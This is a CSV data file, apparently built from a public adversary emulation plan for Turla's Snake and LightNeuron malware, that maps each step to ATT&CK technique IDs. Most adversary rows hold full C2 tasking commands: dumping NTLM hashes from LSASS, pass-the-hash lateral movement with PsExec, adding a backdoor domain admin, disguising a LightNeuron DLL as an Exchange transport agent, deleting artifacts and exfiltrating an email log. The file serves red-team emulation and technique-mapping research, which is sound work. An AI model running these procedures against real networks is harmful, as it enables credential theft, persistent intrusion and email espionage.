org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
turla_snake,turla_snake,unknown,turla_snake::43,43,Dump NTLM hashes on the file server (Adversary),"id: 256ed126-a10c-4736-a074-216ab90da8f2 | name: Dump NTLM hashes on the file server (Adversary) | description: Task Snake to run Mimikatz to dump all NTLM hashes from LSASS.exe.
 | tactic: Credential Access | technique: attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory | procedure_group: procedure_credential_access | procedure_step: 16.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 3, ""proc"": ""C:\\Windows\\System32\\loadperf.exe"", ""args"": ""\""pr::d\"" \""slsa::lop\"" \""quit\""""}' --task-wait-timeout 60 | grep #{domain.admin.ntlm}
 | input_arguments: domain.admin.ntlm: description: The NTLM of a domain admin. | type: string | default: f3fcd61f987a97da49ce5f650b4e6539 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::44,44,OS Credential Dumping: LSASS Memory,attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory,"[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::45,45,Install the 3rd Snake installer on the third target host (Adversary),"id: b4018de2-bb0c-493e-8fe3-5f355831012f | name: Install the 3rd Snake installer on the third target host (Adversary) | description: Task Snake to pass-the-hash using the previously discovered NTLM hash to run PsExec and install Snake on the target workstation.
 | tactic: Lateral Movement | technique: attack_id: T1550.002 | name: Use Alternate Authentication Material: Pass the Hash | procedure_group: procedure_lateral_movement | procedure_step: 17.A.1 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 3, ""proc"": ""C:\\Windows\\System32\\loadperf.exe"", ""args"": ""\""pr::d\"" \""slsa::htp /user:#{domain.admin.user} /ntlm:#{domain.admin.ntlm} /domain:#{network.domain.name}.local /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\fs_mgr.exe /sys:1 /prun:C:\\Windows\\System32\\cmu_svc.exe\"" \""quit\""""}' --task-wait-timeout 60
 | input_arguments: third.target.host: description: The hostname of the third target host. | type: string | default: uosis | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1550.002""]","[""T1550""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::46,46,Use Alternate Authentication Material: Pass the Hash,attack_id: T1550.002 | name: Use Alternate Authentication Material: Pass the Hash,"[""T1550.002""]","[""T1550""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::47,47,Delete artifacts from the file server (Adversary),"id: ca32f105-2e35-4524-8589-0f71d92d98f6 | name: Delete artifacts from the file server (Adversary) | description: Delete PsExec, the Snake installer, and Mimikatz from the file server.
 | tactic: Defense Evasion | technique: attack_id: T1070.004 | name: Indicator Removal: File Deletion | procedure_group: None | procedure_step: 17.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 1, ""command"": ""del /Q C:\\Windows\\System32\\fs_mgr.exe C:\\Windows\\System32\\loadperf.exe C:\\Windows\\System32\\cmu_svc.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::48,48,Indicator Removal: File Deletion,attack_id: T1070.004 | name: Indicator Removal: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::49,49,Enumerate processes (Adversary),"id: 27083aa1-9a0d-4fe4-9154-fa6f0598e2f9 | name: Enumerate processes (Adversary) | description: Task Snake to enumerate running processes on the machine to discover processes under the domain admin.
 | tactic: Discovery | technique: attack_id: T1057 | name: Process Discovery | procedure_group: procedure_discovery | procedure_step: 17.A.4 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 3, ""proc"": ""tasklist.exe"", ""args"": ""/v""}' --task-wait-timeout 60 | grep '#{domain.admin.user}' -i
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::50,50,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::51,51,Create a new domain user (Adversary),"id: 384f3d1f-97f1-4070-98c5-764de023ed2c | name: Create a new domain user (Adversary) | description: Task Snake to create a new domain user using an access token from one of the domain admin processes. 
The new domain user will be used as a backdoor domain admin account for persistence on the domain.
 | tactic: Persistence | technique: attack_id: T1136.002 | name: Create Account: Domain Account | procedure_group: procedure_persistence | procedure_step: 17.A.5 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""net user #{new.domain.user} #{new.domain.password} /add /domain"", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60
 | input_arguments: new.domain.user: description: The username of the new domain user. | type: string | default: leshy | new.domain.password: description: The password of the new domain user. | type: string | default: Password12345 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1136.002""]","[""T1136""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::52,52,Create Account: Domain Account,attack_id: T1136.002 | name: Create Account: Domain Account,"[""T1136.002""]","[""T1136""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::53,53,Add the new domain user to the Domain Admins group (Adversary),"id: 36d93251-6932-49b9-82ad-994abd27730a | name: Add the new domain user to the Domain Admins group (Adversary) | description: Task Snake to create a new domain admin using the domain admin's access token.
 | tactic: Persistence | technique: attack_id: T1136.002 | name: Create Account: Domain Account | procedure_group: procedure_persistence | procedure_step: 17.A.5 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""net group \""Domain Admins\"" #{new.domain.user} /add /domain"", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1136.002""]","[""T1136""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::54,54,Create Account: Domain Account,attack_id: T1136.002 | name: Create Account: Domain Account,"[""T1136.002""]","[""T1136""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::55,55,Download LightNeuron (Adversary),"id: c5bceb16-2f13-40a5-b460-9adb1d567b76 | name: Download LightNeuron (Adversary) | description: Task Snake to download LightNeuron
 | tactic: Execution | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_execution | procedure_step: 18.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 4, ""file"": ""ln_transport_agent.dll"", ""dest"":""C:\\Windows\\System32\\mtxconf.dll""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::56,56,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::57,57,Download the companion DLL for LightNeuron (Adversary),"id: b43fb6c6-05d2-42ff-9083-e70d5dbea078 | name: Download the companion DLL for LightNeuron (Adversary) | description: Task Snake to download the companion DLL for LightNeuron.
 | tactic: Execution | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_execution | procedure_step: 18.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 4, ""file"": ""n_installer_aux.dll"", ""dest"":""C:\\Windows\\System32\\mtxcli.dll""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::58,58,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::59,59,Download the Powershell installation script for LightNeuron (Adversary),"id: bcea95e5-76a0-4774-b51d-cdf6b1fd9ce0 | name: Download the Powershell installation script for LightNeuron (Adversary) | description: Task Snake to download the Powershell installation script for LightNeuron.
 | tactic: Execution | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_execution | procedure_step: 18.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 4, ""file"": ""msiex.ps1"", ""dest"":""C:\\Windows\\System32\\msiex.ps1""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::60,60,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::61,61,Download the LightNeuron email rules file (Adversary),"id: 62f66621-1ff8-4054-bbd8-b3f374d55199 | name: Download the LightNeuron email rules file (Adversary) | description: Task Snake to download the LightNeuron email rules file.
 | tactic: Execution | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_execution | procedure_step: 18.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 4, ""file"": ""rules.xml"", ""dest"":""C:\\Windows\\System32\\wdr.rules.xml""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::62,62,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::63,63,Download the LightNeuron config file (Adversary),"id: 09fc13b4-b345-41ce-b5a8-4214a37b627a | name: Download the LightNeuron config file (Adversary) | description: Task Snake to download the LightNeuron config file.
 | tactic: Execution | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_execution | procedure_step: 18.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 4, ""file"": ""winmail.dat"", ""dest"":""C:\\Windows\\System32\\perfe009.dat""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::64,64,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::65,65,Copy LightNeuron transport agent DLL to the Exchange Server (Adversary),"id: fea61ba7-d932-4a42-b988-5cf9de3ed118 | name: Copy LightNeuron transport agent DLL to the Exchange Server (Adversary) | description: Task Snake to copy LightNeuron using token impersonation to perform the copy as the domain admin.
 | tactic: Lateral Movement | technique: attack_id: T1570 | name: Lateral Tool Transfer | procedure_group: procedure_lateral_movement | procedure_step: 18.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""copy C:\\Windows\\System32\\mtxconf.dll \""\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\agents\\Hygiene\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll\"""", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::66,66,Lateral Tool Transfer,attack_id: T1570 | name: Lateral Tool Transfer,"[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::67,67,Copy LightNeuron companion DLL to the Exchange Server (Adversary),"id: 8c6bfbe8-60f0-4ca8-a955-c35be84be374 | name: Copy LightNeuron companion DLL to the Exchange Server (Adversary) | description: Task Snake to copy the LightNeuron companion DLL using token impersonation to perform the copy as the domain admin.
 | tactic: Lateral Movement | technique: attack_id: T1570 | name: Lateral Tool Transfer | procedure_group: procedure_lateral_movement | procedure_step: 18.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""copy C:\\Windows\\System32\\mtxcli.dll \""\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\exdbdata.dll\"""", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::68,68,Lateral Tool Transfer,attack_id: T1570 | name: Lateral Tool Transfer,"[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::69,69,Copy PowerShell installation script to the Exchange Server (Adversary),"id: 2d061b67-5d49-4a0c-a7af-1b8a3a6fdd78 | name: Copy PowerShell installation script to the Exchange Server (Adversary) | description: Task Snake to copy PowerShell installation script to the Exchange Server using token impersonation to perform the copy as the domain admin.
 | tactic: Lateral Movement | technique: attack_id: T1570 | name: Lateral Tool Transfer | procedure_group: procedure_lateral_movement | procedure_step: 18.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""copy C:\\Windows\\System32\\msiex.ps1 \\\\#{fourth.target.host}\\C$\\Windows\\System32\\msiex.ps1"", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::70,70,Lateral Tool Transfer,attack_id: T1570 | name: Lateral Tool Transfer,"[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::71,71,Copy email rules file to the Exchange server (Adversary),"id: ded4d5a0-bcd6-41f8-899b-9fa4fddac445 | name: Copy email rules file to the Exchange server (Adversary) | description: Task Snake to copy the email rules file to the Exchange server, using token impersonation to perform the copy as the domain admin.
 | tactic: Lateral Movement | technique: attack_id: T1570 | name: Lateral Tool Transfer | procedure_group: procedure_lateral_movement | procedure_step: 18.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""copy C:\\Windows\\System32\\wdr.rules.xml \\\\#{fourth.target.host}\\C$\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml"", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::72,72,Lateral Tool Transfer,attack_id: T1570 | name: Lateral Tool Transfer,"[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::73,73,Copy config file to the Exchange server (Adversary),"id: 0ee2902a-f75e-4367-9e99-2124d3070b4e | name: Copy config file to the Exchange server (Adversary) | description: Task Snake to copy the config file to the Exchange server, using token impersonation to perform the copy as the domain admin.
 | tactic: Lateral Movement | technique: attack_id: T1570 | name: Lateral Tool Transfer | procedure_group: procedure_lateral_movement | procedure_step: 18.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""copy C:\\Windows\\System32\\perfe009.dat \""\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\winmail.dat\"""", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::74,74,Lateral Tool Transfer,attack_id: T1570 | name: Lateral Tool Transfer,"[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::75,75,Install LightNeuron on the Exchange Server (Adversary),"id: 6dd62c1c-b65c-4e28-b241-04121cbbc9af | name: Install LightNeuron on the Exchange Server (Adversary) | description: Task Snake to install LightNeuron remotely using WMI and PowerShell, using the domain admin's token
 | tactic: Persistence | technique: attack_id: T1505.002 | name: Server Software Component: Transport Agent | procedure_group: procedure_persistence | procedure_step: 18.A.7 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 3, ""proc"": ""wmic.exe"", ""args"": ""/node:#{fourth.target.host} /privileges:enable /output:STDOUT process call create \""cmd.exe /c powershell.exe -File C:\\Windows\\System32\\msiex.ps1 > C:\\Windows\\Temp\\msiexinstallation.log 2>&1\"""", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60 | grep 'ReturnValue = 0;' -i
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1505.002""]","[""T1505""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::76,76,Server Software Component: Transport Agent,attack_id: T1505.002 | name: Server Software Component: Transport Agent,"[""T1505.002""]","[""T1505""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::77,77,Check installation log (Adversary),"id: 658daa6f-97c0-41c0-af97-d6b4969d2e7c | name: Check installation log (Adversary) | description: Task Snake to check the installation log for any errors.
 | tactic: Execution | technique: attack_id: T1059.003 | name: Command and Scripting Interpreter: Windows Command Shell | procedure_group: x | procedure_step: x | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""type \\\\#{fourth.target.host}\\C$\\Windows\\Temp\\msiexinstallation.log"", ""runas"": ""#{network.domain.name}\\#{domain.admin.user}""}' --task-wait-timeout 60 | grep ""Waiting for service 'Microsoft Exchange Transport (MSExchangeTransport)' to start..."" -i
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1059.003""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::78,78,Command and Scripting Interpreter: Windows Command Shell,attack_id: T1059.003 | name: Command and Scripting Interpreter: Windows Command Shell,"[""T1059.003""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::79,79,Delete artifacts from the fourth target host (Adversary),"id: 38023f7d-d776-46bb-bbfc-1f4853e8169b | name: Delete artifacts from the fourth target host (Adversary) | description: Task Snake to remove artifacts from the fourth target host:
 | tactic: Defense Evasion | technique: attack_id: T1070.004 | name: Indicator Removal: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 18.A.9 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.snake.id} '{""type"": 1, ""command"": ""del /Q C:\\Windows\\System32\\msiex.ps1 C:\\Windows\\System32\\wdr.rules.xml C:\\Windows\\System32\\mtxconf.dll C:\\Windows\\System32\\mtxcli.dll C:\\Windows\\System32\\perfe009.dat""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.snake.id","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::80,80,Indicator Removal: File Deletion,attack_id: T1070.004 | name: Indicator Removal: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::81,81,Perform system network configuration discovery (Adversary),"id: def5cfe8-7aea-4cd3-803f-2c55e616c1fe | name: Perform system network configuration discovery (Adversary) | description: Task LightNeuron to perform system network configuration discovery.
 | tactic: Discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | procedure_group: procedure_discovery | procedure_step: 19.A.1-19.A.5 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{lightneuron.implant.id} '5 | ipconfig /all' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_lightneuron_registered: source: lightneuron.implant.id","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::82,82,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::83,83,Exfiltrate the email log file (Adversary),"id: 4d10b3a8-6199-4615-861f-e4292630a9b9 | name: Exfiltrate the email log file (Adversary) | description: Task the LightNeuron implant to exfiltrate the email log file.
 | tactic: Exfiltration | technique: attack_id: T1041 | name: Exfiltration Over C2 Channel | procedure_group: procedure_exfiltration | procedure_step: 19.A.12 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{lightneuron.implant.id} '3 | 0' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_lightneuron_registered: source: lightneuron.implant.id","[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::84,84,Exfiltration Over C2 Channel,attack_id: T1041 | name: Exfiltration Over C2 Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
